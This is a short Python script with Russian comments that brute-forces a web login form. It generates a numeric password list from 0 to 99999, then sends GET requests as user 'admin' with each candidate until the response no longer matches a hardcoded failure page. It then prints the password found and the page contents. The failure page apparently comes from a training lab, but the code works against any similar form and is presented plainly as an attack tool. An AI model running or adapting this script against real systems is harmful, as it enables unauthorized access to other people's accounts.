import requests
b=input("Адрес формы веб формы: ")
c=0
#запись паролей в словарь
with open("slovar.txt","w") as w:
    for i in range(100000):
        w.write(str(i)+"\n")
#броадфорс по словарю
with open("slovar.txt","r") as r:
    l=r.read().split()
    max_c=len(l)
    for i in l:
        #ображение к форме при помощи get запроса с параметрами
        params={"user":"admin","pass":str(i),"submit":"Login"}
        a=requests.get(b,params)
        if (c*100%max_c==0):
            print(str(c*100/max_c) + "%")
        #сверка страницы с ошибочной страницей
        if ("""<p>Логин или пароль неверны!</p>  \n<br /> \n<form method="get">\nUsername: <input type="text" name="user" /> <br /> \nPassword: <input type="password" name="pass" /> <br />\n<input type="submit" name="submit" value="Login" />\n</form> \n""" in a.text)==0:
            #вывод информации о пароле и текста из не ошибочной страницы
            print(l[c])
            print(a.text)
            break
        c+=1
